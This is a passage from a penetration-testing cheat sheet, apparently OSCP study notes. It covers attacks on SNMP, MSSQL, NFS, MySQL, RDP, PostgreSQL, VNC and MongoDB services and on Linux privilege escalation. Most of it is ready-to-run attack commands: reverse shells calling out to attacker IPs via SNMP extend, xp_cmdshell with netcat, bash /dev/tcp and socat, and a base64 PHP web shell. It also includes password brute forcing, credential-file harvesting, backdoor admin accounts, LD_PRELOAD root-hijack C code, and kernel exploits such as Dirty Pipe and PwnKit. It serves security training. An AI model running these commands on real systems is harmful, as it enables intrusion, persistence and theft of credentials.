- **Find SIDs by name**: `lookupnames <username>`
- **Find more SIDs**: `lsaenumsid`
- **RID cycling (check more SIDs)**: `lookupsids <sid>`


## SNMP(s) - 161,162,10161,10162

Simple Network Management Protocol (SNMP), runs on UDP 161 and 162 (trap). The secure version (using TLS) is on 10161 and 10162.

Before getting started, install the MIBs:

```sh
sudo apt install -y snmp snmp-mibs-downloader
sudo download-mibs
```

For resolving further issues with MIBs, see [Using and loading MIBs](https://net-snmp.sourceforge.io/wiki/index.php/TUT:Using_and_loading_MIBS)

Basic SNMP enumeration:

```sh
# nmap snmp scan
nmap --script "snmp* and not snmp-brute" $VICTIM_IP

# quick bruteforce snmp community strings with onesixtyone
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $VICTIM_IP -w 100

# extended bruteforce snmp community strings with hydra
hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt -v $VICTIM_IP snmp

# comprehensive enumeration (system/network/process/software info)
snmp-check $VICTIM_IP

snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.4.1.77.1.2.25 # users
snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.25.4.2.1.2 # processes
snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.6.13.1.3 # ports
snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.25.6.3.1.2 # software
snmpwalk -c public -v2c $VICTIM_IP HOST-RESOURCES-MIB::hrSWInstalledName # software
snmpwalk -c public -v2c 192.168.210.156 NET-SNMP-EXTEND-MIB::nsExtendOutputFull #additional details 


```


Look [here](https://www.rapid7.com/blog/post/2016/05/05/snmp-data-harvesting-during-penetration-testing/) for some other ideas on getting juicy data from SNMP:

- Email addresses
- SNMP community strings
- Password hashes
- Clear text passwords

### 2.13.1 Exploring MIBs with `snmptranslate`

From the [`snmptranslate` Tutorial](https://net-snmp.sourceforge.io/tutorial/tutorial-5/commands/snmptranslate.html):

```sh
# look up numeric OID to get abbreviated name
snmptranslate .1.3.6.1.2.1.1.3.0
snmptranslate -m +ALL .1.3.6.1.2.1.1.3.0

# look up OID node name without fully-qualified path (random access)
snmptranslate -IR sysUpTime.0

# convert abbreviated OID to numeric (dotted-decimal)
snmptranslate -On SNMPv2-MIB::sysDescr.0

# convert abbreviated OID to dotted-text
snmptranslate -Of SNMPv2-MIB::sysDescr.0
# convert numeric (dotted-decimal) to dotted-text
snmptranslate -m +ALL -Of .1.3.6.1.2.1.1.1.0

# get description/extended info about OID node
snmptranslate -Td SNMPv2-MIB::sysDescr.0
# same for numeric
snmptranslate -m +ALL -Td .1.3.6.1.2.1.1.1.0

# get tree view of subset of MIB tree
snmptranslate -Tp -IR system

# look up OID by regex (best match)
snmptranslate -Ib 'sys.*ime'

#  To get a list of all the nodes that match a given pattern, use the -TB flag:
snmptranslate -TB 'vacm.*table'

# find out what directories are searched for MIBS:
net-snmp-config --default-mibdirs # only if installed
snmptranslate -Dinit_mib .1.3 |& grep MIBDIR
```

When using the `-m +ALL` argument, I got the error:

```
Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
```

There is a typo in the file that gets pulled by `snmp-mibs-downloader`. The fix is to replace the existing file with a corrected version, which is located [here](http://pastebin.com/raw/p3QyuXzZ).

### 2.13.2 RCE with SNMP

See [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce)

Easy library to do this: [https://github.com/mxrch/snmp-shell.git](https://github.com/mxrch/snmp-shell.git)

```sh
# manually create reverse shell (update listener IP)
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp"' = createAndGo 'nsExtendCommand."derp"' = /usr/bin/env 'nsExtendArgs."derp"' = 'python -c "import sys,socket,os,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection((\"10.10.14.14\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")"'

# trigger reverse shell by reading the OID
snmpwalk -v2c -c private $VICTIM_IP NET-SNMP-EXTEND-MIB::nsExtendObjects

# delete the reverse shell command from the SNMP table
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp"' = destroy
```

This abuses the NET-SNMP-EXTEND-MIB functionality. See [technical writeup](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/)

## LDAP 389, 636, 3268

```shell 
#we have a valuble bookmark/hutch

#enumerate info without authentication look for users/passwords
ldapsearch -x -H ldap://192.168.242.122 -b "dc=hutch,dc=offsec" > ldap.txt

cat ldap.txt | grep -i "samaccountname"
cat ldap.txt | grep -i "description"


```
## MSSQL - 1443

Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It supports storing and retrieving data across a network (including the Internet).

```sh
# check for known vulns
searchsploit "microsoft sql server"

# if you know nothing about it, try 'sa' user w/o password:
nmap -v -n --script="safe and ms-sql-*" --script-args="mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER" -sV -p 1433 -oA nmap/safe-ms-sql $VICTIM_IP
# if you don't have creds, you can try to guess them, but be careful not to block
# accounts with too many bad guesses
```

**Post-Exploit PrivEsc**

The user running MSSQL server will have the privilege token **SeImpersonatePrivilege** enabled. You will probably be able to escalate to Administrator using this and [JuicyPotato](https://github.com/ohpe/juicy-potato)

### 2.15.1 MSSQL Credential Bruteforcing

```sh
# Be carefull with the number of password in the list, this could lock-out accounts
# Use the NetBIOS name of the machine as domain, if needed
crackmapexec mssql -d DOMAINNAME -u usernames.txt -p passwords.txt $VICTIM_IP
hydra -V -f -L /path/to/usernames.txt –P /path/to/passwords.txt $VICTIM_IP mssql
medusa -h $VICTIM_IP –U /path/to/usernames.txt –P /path/to/passwords.txt –M mssql
```

### 2.15.2 MSSQL Interaction

**Connecting to the MSSQL server**

From kali, for interactive session:

```sh
# simplest tool for interactive MSSQL session
impacket-mssqlclient USERNAME:PASSWORD@VICTIM_IP -windows-auth
# requires double quotes for xp_cmdshell strings

# alternative option, can use single quotes for xp_cmdshell strings
sqsh -S $VICTIM_IP -U 'DOMAIN\USERNAME' -P PASSWORD [-D DATABASE]
```

From Windows:

```bat
sqlcmd -S SERVER -l 30
sqlcmd -S SERVER -U USERNAME -P PASSWORD -l 30
```

**Useful commands:**

```sql
-- show username
select user_name();
select current_user;  -- alternate way

-- show server version
select @@version;

-- get server name
select @@servername;

-- show list of databases ("master." is optional)
select name from master.sys.databases;
exec sp_databases;  -- alternate way
-- note: built-in databases are master, tempdb, model, and msdb
-- you can exclude them to show only user-created databases like so:
select name from master.sys.databases where name not in ('master', 'tempdb', 'model', 'msdb');

-- use database
use master

-- getting table names from a specific database:
select table_name from somedatabase.information_schema.tables;

-- getting column names from a specific table:
select column_name from somedatabase.information_schema.columns where table_name='sometable';

-- get credentials for 'sa' login user:
select name,master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;

-- get credentials from offsec database (using 'dbo' table schema) user table
select * from offsec.dbo.users;

-- error/boolean-based blind injection
' AND LEN((SELECT TOP 1 username FROM dbo.users))=5; -- #

-- time-based blind injection
' WAITFOR DELAY '0:0:3'; -- #
```

### 2.15.3 MSSQL Command Execution

Simple command execution:

```bash
# Username + Password + CMD command
crackmapexec mssql -d DOMAIN -u USERNAME -p PASSWORD -x "whoami" $VICTIM_IP
# Username + Hash + PS command
crackmapexec mssql -d DOMAIN -u USERNAME -H HASH -X '$PSVersionTable' $VICTIM_IP
```

Using interactive session:

```sql
-- Check if you have server admin rights to enable command execution:
-- Returns 1 if admin
select is_srvrolemember('sysadmin');
go

-- Check if already enabled
-- check if xp_cmdshell is enabled
select convert(int, isnull(value, value_in_use)) as cmdshell_enabled from sys.configurations where name = n'xp_cmdshell';
go

-- turn on advanced options; needed to configure xp_cmdshell
exec sp_configure 'show advanced options', 1;reconfigure;
go

-- enable xp_cmdshell
exec sp_configure 'xp_cmdshell', 1;RECONFIGURE;
go

-- Quickly check what the service account is via xp_cmdshell
EXEC xp_cmdshell 'whoami';
go
-- can be shortened to just: xp_cmdshell 'whoami.exe';
-- long form: EXEC master..xp_cmdshell 'dir *.exe'

-- Bypass blackisted "EXEC xp_cmdshell"
DECLARE @x AS VARCHAR(50)='xp_cmdshell'; EXEC @x 'whoami' —

-- Get netcat reverse shell
xp_cmdshell 'powershell iwr -uri http://ATTACKER_IP/nc.exe -out c:\users\public\nc.exe'
go
xp_cmdshell 'c:\users\public\nc.exe -e cmd ATTACKER_IP 443'
go
```

## NFS - 2049

[HackTricks](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)

```sh
# scan with scripts
nmap -n -v -p 2049 -sV --script="safe and nfs-*" -oA nfs-scripts $VICTIM_IP

# list all mountpoints
showmount -a $VICTIM_IP
# list all directories
showmount -d $VICTIM_IP
# list all exports (remote folders you can mount)
showmount -e $VICTIM_IP

# the exports are also in /etc/exports
# look for exports with no_root_squash/no_all_squash setting for privesc
# https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe

# Mounting an exported share:
# mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
# use version 2 because it doesn't have any authentication or authorization
# if mount fails, try without vers=2
# dir may need "/"prefix
# dir is one of showmount -e results (from /etc/exports)
mkdir nfs && \
sudo mount -t nfs -o rw,nolock,vers=2 $VICTIM_IP:DIR nfs

# create user with specific UID to be able to read files on your kali box
# "-s" login shell, "-M" no create home
sudo useradd -u 1014 -s /usr/sbin/nologin -M tempuser
# removing user when done:
sudo deluser --remove-home tempuser && sudo groupdel tempuser
# or just switch to root to read nearly everything:
sudo su
# if needing a specific group:
sudo groupadd -g 1010 tempgroup
sudo usermod -a -G tempgroup tempuser
```

## MySQL - 3306

Logging in:

```sh

## Remotely:
mysql -u root -h HOSTNAME

## Locally:
# as root without password (if allowed)
mysql -u root
# same, but prompt for password
mysql -u root -p
# provide password
mysql -u root -p'root'

```

Once logged in, check out the schema and environment:

```sql
-- show list of databases
show databases;
-- Set current database to mysql
use mysql;
-- show tables in current database
show tables;
-- describe the table schema for 'user' table
describe user;
select table_name,column_name,table_schema from information_schema.columns where table_schema=database();

-- show MySQL version (both versions work)
select version();
select @@version;
-- show logged-in user
select user();
select system_user();
-- show active database
select database();
show databases;
-- show system architecture
select @@version_compile_os, @@version_compile_machine;
show variables like '%compile%';
-- show plugin directory (for UDF exploit)
select @@plugin_dir;
show variables like 'plugin%';

-- Try to execute code (try all ways)
\! id
select sys_exec('id');
select do_system('id');

-- Try to read files
select load_file('/etc/passwd');
-- more complex method
create table if not exists test (entry TEXT);
load data local infile "/etc/passwd" into table test fields terminated by '\n';
select * from test;
-- show file privileges of 'test' user
select user,file_priv from mysql.user where user='test';
-- show all privs of current user
select * from mysql.user where user = substring_index(user(), '@', 1) ;

-- Look at passwords
-- MySQL 5.6 and below
select host, user, password from mysql.user;
-- MySQL 5.7 and above
select host, user, authentication_string from mysql.user;

-- add new user with full privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to test identified by 'test' WITH GRANT OPTION;
-- show exact privileges
use information_schema; select grantee, table_schema, privilege_type from schema_privileges;
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
```

### ROOT MySQL cred UDF Exploit

```sh

https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf

You can use this guide https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/?source=post_page-----6cc4d6eea356--------------------------------
```


### 2.17.2 Grabbing MySQL Passwords

```sh
# contains plain-text password of the user debian-sys-maint
cat /etc/mysql/debian.cnf

# contains all the hashes of the MySQL users (same as what's in mysql.user table)
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

### 2.17.3 Useful MySQL Files

- Configuration Files:
  - Windows
    - config.ini
    - my.ini
    - windows\my.ini
    - winnt\my.ini
    - INSTALL_DIR/mysql/data/
  - Unix
    - my.cnf
    - /etc/my.cnf
    - /etc/mysql/my.cnf
    - /var/lib/mysql/my.cnf
    - ~/.my.cnf
- Command History:cd /
  - ~/.mysql.history
- Log Files:
  - connections.log
  - update.log
  - common.log


## RDP - 3389

**Bruteforce RDP Credentials:**

```sh
# brute force single user's password (watch out for account lockout! check password policy with MSRPC)
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://1

# password spray against list of users
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://VICTIM_IP

https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.2.182/32 -u admin -c Aa123456

```


**Add RDP User**: (good for persistence)

```powershell
net user pwned password123! /add
net localgroup Administrators pwned /add
net localgroup "Remote Desktop Users" pwned /add
# enable remote desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
# delete user
net user derp /del
# disable remote desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```


## PostgreSQL - 5432


**NOTE**: `psql` supports tab completion for table names, db names.

```postgresql
--bruteforce
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 192.168.206.56 postgres

-- connect or psql
psql -U postgres -p 5432 -h 192.168.

-- List databases
SELECT datname FROM pg_database;
\l
\list

-- List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

\c <database> -- use (connect to) the database
\d -- List tables
\d+ <tablename> -- describe table
-- SQL standard way to describe table:
select column_name, data_type from information_schema.columns where table_name = <tablename>

-- Get current user
Select user;
\du+ -- Get users roles

--Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

-- Get languages
SELECT lanname,lanacl FROM pg_language;

-- Show installed extensions
SHOW rds.extensions;

-- Get history of commands executed
\s

-- Check if current user is superuser 
-- (superuser always has file read/write/execute permissions)
-- 'on' if true, 'off' if false
SELECT current_setting('is_superuser');
```

**Reading text files:**

```postgresql
select string_agg((select * from pg_read_file('/etc/passwd', 0, 1000000)), ' | ')
```

**Writing 1-liner text files:**

```postgresql
-- base64 payload: '<?php system($_GET["cmd"]);?>'
copy (select convert_from(decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4K','base64'),'utf-8')) to '/var/www/html/ws.php'
```

**Code Execution:**

```postgresql
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
```

You can put any bash shell command in the string after PROGRAM (e.g. replace `'id'` with `'/bin/bash -c \"bash -i >& /dev/tcp/192.168.45.230/443 0>&1\"'`.


Postgres syntax is different from MySQL and MSSQL, and it's stricter about types. This leads to differences when doing SQL injection.

- String concat operator: `||`
- LIKE operator: `~~`
- Match regex (case sensitive): `~`
- [More operator documentation](https://www.postgresql.org/docs/6.3/c09.htm)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-error-based) has great documentation on Postgres injection.


Interesting Groups/Roles:

- **`pg_execute_server_program`** can **execute** programs
- **`pg_read_server_files`** can **read** files
- **`pg_write_server_files`** can **write** files



## VNC - 5900,5800

VNC is a graphical remote desktop sharing system running on TCP port 5900, with a web interface on port 5800.

```sh
# nmap scan
nmap -v -n -sV --script vnc-info,realvnc-auth-bypass,vnc-title -oA nmap/vnc -p 5900 $VICTIM_IP

# connect ('-passwd passwd.txt' to use password file)
vncviewer $VICTIM_IP

# bruteforcing
hydra -V -f -L user.txt –P pass.txt -s PORT vnc://$VICTIM_IP
medusa -h $VICTIM_IP –u root -P pass.txt –M vnc
ncrack -V --user root -P pass.txt $VICTIM_IP:PORT
patator vnc_login host=$VICTIM_IP password=FILE0 0=pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
```



## MongoDB - 27017

MongoDB is a common open-source NoSQL database. It's service runs on 27017 by
default.

Compared to SQL databases:
- Instead of tables, it has *collections*
- Instead of rows, it has *documents*
- Instead of columns, it has *fields*

Data is stored using [BSON](https://bsonspec.org/), which is a binary-serialized form of JSON.

```sql
# starting mongo app, connecting to database server
mongosh     # connect to localhost:27017, no creds
mongosh -u <user> -p <password>
mongosh hostname:port
mongosh --host <host> --port <port>

# show list of databases
show databases;
# connect to database named "admin"
use admin;
# list names of collections (tables) in connected database
db.getCollectionNames();
# create new collection (table) called "users"
db.createCollection("users")
# create new document (row) in users collection:
db.users.insert({id:"1", username: "derp", email: "derp@derp.com", password: "herpderp"})
# show all documents (rows) in the users collection:
db.users.find()
# get all documents matching search criteria
db.users.find({id: {$gt: 5}})
# get first matching user document
db.users.findOne({id: '1'})
# change fields in a users document
db.users.update({id:"1"}, {$set: {username: "bubba"}});
# delete a document (by id)
db.users.remove({'id':'1'})
# drop the users collection (delete everything)
db.users.drop()
```

[Operators](https://docs.mongodb.com/manual/reference/operator/query/) (for searches/matching):

- $eq
- $ne
- $gt
- $lt
- $and
- $or
- $where
- $exists
- $regex
  


# Miscellaneous Linux Commands

```sh
#terminal history 
nano ~/.zsh_history

#make an alias
nano ~/.zshrc
source ~/.zshrc 

# if you know what you're looking for, you can cheat and check whether/where that option is in the wordlist you're trying with 
grep -n <search term> <wordlist>

#find out if using bash or zshell
echo $0

#open terminal in root mode
sudo thunar

#look for root processes
ps -ef | grep root

#update package 
sudo apt upgrade crackmapexec

#tar.gz
tar -xzvf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz

#fix the path
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
python -c 'import pty; pty.spawn("/bin/bash")'
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin

#nano wrapping
esc + $

#tcpdump listen for pings
sudo tcpdump -i tun0 icmp and src host 192.168.238.146


```

To display the metadata of any _supported file_,[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/target-reconnaissance/information-gathering#fn4) we can use _exiftool_.[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/target-reconnaissance/information-gathering#fn5) Let's provide the arguments **-a** to display duplicated tags and **-u** to display unknown tags along with the filename **brochure.pdf**:

```shell
exiftool -a -u brochure.pdf 
```
# Reverse Shells

```shell
#upgrade
bash -i
python3 -c 'import pty; pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null

#python reverse shell
https://github.com/orestisfoufris/Reverse-Shell---Python/blob/master/reverseshell.py

#socat
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444
#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

# Sensitive Files/Passwords on Linux

```sh
wget http://192.168.45.230/linuxprivesc/pspy64
./pspy64

######run alll the below with this:
wget http://192.168.49.106/linuxprivesc/sensitiveinfo.sh && chmod +x sensitiveinfo.sh
./sensitiveinfo.sh

#find local file
find / -type f -name "local.txt"

# shell history
cat /home/*/.*history
grep -E 'telnet|ssh|mysql' /home/*/.*history 2>/dev/null

# credential files
ls -l /home/*/.ssh/id_*  # ssh keys
ls -AlR /home/*/.gnupg  # PGP keys

# "shadow" files usually have credentials
find / -path '/usr' -prune -o -type f -readable \( -iname 'shadow*' -o -iname '.shadow*' \) -ls 2>/dev/null

# Wordpress config, can have credentials
find / -type f -readable -name wp-config.php -ls 2>/dev/null
# normally at:
/var/www/wordpress/wp-config.php

find / -type f -readable -name doas.conf -ls 2>/dev/null

# look for other php config files that may have creds
find / -type f -readable -name '*config.php' -ls 2>/dev/null

# Apache htaccess files might indicate files/directories with sensitive info
find / -type f -readable -name .htaccess -ls 2>/dev/null

# mysql configs, can have creds
find / -type f -readable -name '*my.cnf' -ls 2>/dev/null

# find *_history files (bash, zsh, mysql, etc.), which may have sensitive info
find / -xdev -type f -readable -name '*_history' -ls 2>/dev/null

# AWS credentials
find / -xdev -type f -readable -path '*/.aws/*' \( -name credentials -o -name config \) -ls 2>/dev/null

# Docker config, has credentials
find / -xdev -type f -readable -path '*/.docker/*' -name config.json -ls 2>/dev/null

# GNUPG directory
find / -xdev -type d -readable -name '.gnupg' -ls 2>/dev/null

# Confluence config has credentials
find / -xdev -type f -readable -name confluence.cfg.xml -ls 2>/dev/null
# normally at:
/var/atlassian/application-data/confluence/confluence.cfg.xml

# VNC passwd files have creds
find / -xdev -type f -path '*/.*vnc/*' -name passwd -ls 2>/dev/null

# rarely, .profile files have sensitive info
find / -xdev -type f -readable -name '.*profile' -ls 2>/dev/null
```

Sometimes git repos contain sensitive info in the git history.

```sh

https://medium.com/stolabs/git-exposed-how-to-identify-and-exploit-62df3c165c37

# view commit history
git log

# show changes for a commit
git show COMMIT_HASH

# search for sensitive keywords in current checkout
git grep -i password

# search for sensitive keywords in file content of entire commit history
git grep -i password $(git rev-list --all)
```

# Automated Tools 

```shell
#linuxsmartenum
#https://github.com/diego-treitos/linux-smart-enumeration
wget http://192.168.49.106/linuxprivesc/lse.sh && chmod 700 lse.sh 
./lse.sh -l1

#SUIDchecker
wget http://192.168.49.106/linuxprivesc/suid3num.py --no-check-certificate && chmod 777 suid3num.py
#or 3
python3 suid3num.py

#linpeas
wget http://192.168.49.106/linuxprivesc/linpeas && chmod 700 linpeas
./linpeas
# -D for debug 
# Output to file
./linpeas -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors


```

# Linux Privilege Escalation

### Easy Fruit

```sh

# from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1.
# Exploit works even if user isn't in sudoers file.
sudoedit -s /
# Vulnerable if it says 'sudoedit: /: not a regular file' instead of 'usage:...'
# use exploit: https://github.com/CptGibbon/CVE-2021-3156.git

# check sudo version
sudo -V
# [Sudo-1.8.31-Root-Exploit]
# if older than 1.8.28, root privesc:
sudo -u#-1 /bin/bash
# or sudo -u \#$((0xffffffff)) /bin/bash

```

### Adding root user to /etc/shadow or /etc/passwd

```sh
# if /etc/shadow is writable
# generate new password
openssl passwd -6 pwned
# or
mkpasswd -m sha-512 pwned
# edit /etc/shadow and overwrite hash of root with this one

# if /etc/passwd is writable
echo 'pwned:$(openssl passwd -6 pwned):0:0:root:/root:/bin/bash' >> /etc/passwd
# alternatively
echo 'derp:$(mkpasswd -m sha-512 herpderp):0:0:root:/root:/bin/bash' >> /etc/passwd

# the empty/blank crypt hash for old Linux systems is U6aMy0wojraho.
# if you see this in an /etc/passwd (or shadow), the user has no password!

```

### Abusing `sudo`


> ⚠ **NOTE**: If you get "Permission denied" error, check `/var/log/syslog` to see if the `audit` daemon is blocking you with `AppArmor` (enabled by default on Debian 10).

```sh
# check for sudo permissions
sudo -l
# if you see a binary with '(root) NOPASSWD ...' you might be in luck
# check the following website for escalation methods:
# https://gtfobins.github.io/#+sudo

# Example: awk
sudo awk 'BEGIN {system("/bin/sh")}'

# Example: find
sudo find . -exec /bin/sh \; -quit
```

**Grant passwordless sudo access**

Edit the `/etc/sudoers` file to have the following line:

```
myuser ALL=(ALL) NOPASSWD: ALL
```


**(sudo -l) LD_PRELOAD and LD_LIBRARY_PATH**

For this to work, `sudo -l` must show that either LD_PRELOAD or LD_LIBRARY_PATH
are inherited from the user's environment:
```
env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```

`preload.c`:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#define _GNU_SOURCE
#include <unistd.h>

void _init() {
	unsetenv("LD_PRELOAD");
	// setresuid(0,0,0);
  setuid(0);
  setgid(0);
	system("/bin/bash -p");
  exit(0);
}
```

`library_path.c`:
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
  exit(0);
}
```

Usage:

```sh
# LD_PRELOAD
# compile malicious preload binary
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
# use it to get root
sudo LD_PRELOAD=/tmp/preload.so program_name_here

# LD_LIBRARY_PATH
# see which shared libraries are used
ldd $(which apache2)
# compile malicious library as one of existing ones
gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
# use it to get root
sudo LD_LIBRARY_PATH=/tmp apache2
# note, some ld-files work better than others, so try every option from ldd
# if the first attempt fails. May also need to alter file to hook function
# being called (must exactly match function signature)
```


### Abusing Setuid Binaries and Capabilities

```sh
# find all root-owned SUID and GUID binaries
find / -type f \( -perm -g+s -a -gid 0 \) -o \( -perm -u+s -a -uid 0 \) -ls 2>/dev/null
#Then use GTFObins to determine how to abuse. 

#find capabalities and look for setuid+ep
/usr/sbin/getcap -r / 2>/dev/null

```

### Cron Jobs/scheduled tasks 

```shell
#find jobs look for which my user has write access to 
ls -lah /etc/cron*

#also do
less /etc/crontab

#look at all cron jobs in syslog
grep "CRON" /var/log/syslog

```

### Using NFS for Privilege Escalation

NFS Shares inherit the **remote** user ID, so if root-squashing is disabled,
something owned by root remotely is owned by root locally.

```sh
# check for NFS with root-squashing disabled (no_root_squash)
cat /etc/exports

# On Kali box:
sudo su   # switch to root
mkdir /tmp/nfs
mount -o rw,nolock,vers=2 $VICTIM_IP:/share_name /tmp/nfs
# Note: if mount fails, try without vers=2 option.
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf

# on victim machine
/tmp/shell.elf
```

### Using Docker for Privesc

GTFOBIN

### Linux Kernel Exploits

⚠ **NOTE**: Use LinPEAS to enumerate for kernel vulnerabilities. 

#### Dirty Cow

[CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-5195) is effective against Linux kernels 2.x through 4.x before 4.8.3.

```sh
# easiest if g++ avail
searchsploit -m 40847
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
./dcow -s

# Also good:
searchsploit -m 40839

# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
```


#### PwnKit

[CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034) PwnKit is effective against many Linux variants:
- Ubuntu 10 - Ubuntu 21.10
- Debian 7 - Debian 11
- RedHat 6.0 - RedHat 8.4 (and similar Fedora & CentOS versions?)

Affects pkexec (polkit) < 0.120.

**Detailed vulnerable versions:**  [reference](https://www.datadoghq.com/blog/pwnkit-vulnerability-overview-and-remediation/)

Check what's installed with `dpkg -s policykit-1`

Ubuntu:

| Ubuntu version     | Latest vulnerable version | First fixed version         |
| ------------------ | ------------------------- | --------------------------- |
| 14.04 LTS (Trusty) | 0.105-4ubuntu3.14.04.6    | 0.105-4ubuntu3.14.04.6+esm1 |
| 16.04 LTS (Xenial) | 0.105-14.1ubuntu0.5       | 0.105-14.1ubuntu0.5+esm1    |
| 18.04 LTS (Bionic) | 0.105-20                  | 0.105-20ubuntu0.18.04.6     |
| 20.04 LTS (Focal)  | 0.105-26ubuntu1.1         | 0.105-26ubuntu1.2           |

Debian:

| Debian version | Latest vulnerable version | First fixed version |
| -------------- | ------------------------- | ------------------- |
| Stretch        | 0.105-18+deb9u1           | 0.105-18+deb9u2     |
| Buster         | 0.105-25                  | 0.105-25+deb10u1    |
| Bullseye       | 0.105-31                  | 0.105-31+deb11u1    |
| (unstable)     | 0.105-31.1~deb12u1        | 0.105-31.1          |

Checking for vulnerability:

```sh
# check suid bit set:
ls -l /usr/bin/pkexec

# check for vulnerable version (see above tables):
dpkg -s policykit-1
```

Exploit:

```sh
wget http://192.168.45.230/linuxprivesc/PwnKit
chmod +x ./PwnKit
./pwnkit # interactive shell
./PwnKit 'id' # single command
# it will tell you nicely if the exploit fails when the system is patched.
```


#### 6.2.8.3 Get-Rekt BPF Sign Extension LPE

[CVE-2017-16995](https://nvd.nist.gov/vuln/detail/CVE-2017-16995) is effective against Linux kernel 4.4.0 - 4.14.10.
- Debian 9
- Ubuntu 14.04 - 16.04
- Mint 17 - 18
- Fedora 25 - 27

```sh
# on kali, grab source
searchsploit -m 45010
python -m http.server 80

# on victim, download, compile, and execute
wget LISTEN_IP/45010.c -O cve-2017-16995
gcc cve-2017-16995.c -o cve-2017-16995
```


#### Dirty Pipe 5.8 + 

[CVE-2022-0847](https://nvd.nist.gov/vuln/detail/CVE-2022-0847) affects Linux kernels 5.8.x up. The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102.
- Ubuntu 20.04 - 21.04
- Debian 11
- RHEL 8.0 - 8.4
- Fedora 35

```sh
wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c
python -m http.server 80

# on victim
wget LISTEN_IP/exploit.c
gcc exploit.c -o exploit # may need to compile locally with "-static"
./exploit # if statically compiled, may complain about system() failing, but might be ok

# check if exploit worked
grep root /etc/passwd # should see hash with 'aaron' salt

# become r00t
su - # use password 'aaron'

# to restore to pre-exploit state
# if you get error "su: must be run from a terminal"
# or error "system() function call seems to have failed :("
# but the exploit successfully changed root's password in /etc/passwd
# - login as root with the password aaron.
# - restore /etc/passwd
mv /tmp/passwd.bak /etc/passwd
```



## Miscellaneous Windows Commands

